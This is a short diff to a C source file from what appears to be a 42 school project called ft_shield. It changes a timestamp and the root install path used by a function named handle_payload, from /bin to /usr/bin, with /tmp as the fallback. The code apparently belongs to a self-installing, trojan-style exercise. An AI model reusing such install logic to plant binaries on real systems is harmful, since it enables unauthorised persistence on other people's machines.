@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/16 18:15:16 by mbatty            #+#    #+#             */
-/*   Updated: 2025/12/02 12:27:53 by mbatty           ###   ########.fr       */
+/*   Updated: 2025/12/02 12:39:10 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -34,7 +34,7 @@ static void	handle_payload(bool root, char **envp)
 	char	exec_path[4096] = {0};
 	
 	if (root)
-		payload_path = "/bin/ft_shield";
+		payload_path = "/usr/bin/ft_shield";
 	else
 		payload_path = "/tmp/binft_shield";
 
